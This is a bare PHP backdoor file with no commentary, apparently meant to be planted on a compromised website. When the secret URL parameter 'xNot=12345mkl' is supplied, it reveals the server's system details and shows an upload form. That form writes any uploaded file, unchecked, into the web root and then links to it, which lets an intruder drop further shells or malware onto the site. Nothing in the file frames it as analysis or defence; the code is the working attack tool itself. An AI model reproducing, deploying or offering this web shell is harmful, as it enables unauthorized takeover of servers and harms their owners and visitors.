<?php
if($_GET['xNot'] == '12345mkl' ) {
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='xNot'>
      <input type='submit' name='upload' value='upload'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['xNot']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['xNot']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "Sukses Cuk -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a>";
        } else {
            echo "Gagal Up :(";
        }
    } else {
        if(@copy($_FILES['xNot']['tmp_name'], $files)) {
            echo "sukses upload <b>$files</b> di folder ini";
        } else {
            echo "Gagal up :(";
        }
    }
}
}
?>